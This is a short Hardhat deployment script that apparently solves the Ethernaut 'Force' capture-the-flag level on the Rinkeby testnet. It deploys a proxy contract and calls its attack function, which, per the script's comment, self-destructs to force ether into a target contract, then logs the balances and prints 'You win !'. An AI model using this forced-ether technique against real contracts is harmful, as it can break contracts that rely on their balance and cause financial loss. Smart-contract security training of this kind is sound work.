/* eslint-disable space-before-function-paren */
/* eslint-disable no-undef */
const { ethers } = require('hardhat');
const hre = require('hardhat');
const { deployed } = require('./deployed');
const INSTANCE = "0x1Be48bddd08547605757f82818F95915b487a143"


async function main() {
 
  const [deployer] = await ethers.getSigners();
  const rinkeby = await ethers.getDefaultProvider('rinkeby')
  console.log(`Deploying proxy contract with address ${deployer.address}`)
  
  const Proxy = await hre.ethers.getContractFactory('Proxy')
  const proxy = await Proxy.deploy()

  await proxy.deployed()

  await deployed('Proxy', hre.network.name, proxy.address)

  console.log('                          INSTANCE STATE')
  console.log("Balance of Force contract: ", await rinkeby.getBalance(INSTANCE))
  console.log("Balance of Proxy contract: ", await rinkeby.getBalance(proxy.address))

  // STEP 2
  console.log("Auto destruction of our proxy contract to send ether to the Force contract")
  const tx2 = await proxy.attack(INSTANCE, {value: ethers.utils.parseEther('0.001')})
  await tx2.wait()
  console.log("Transaction confirmed !\n")

  console.log('                          INSTANCE STATE')
  console.log("Balance of Force contract: ", await rinkeby.getBalance(INSTANCE))
  console.log("Balance of Proxy contract: \n", await rinkeby.getBalance(proxy.address))

  console.log("You win !")
  
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
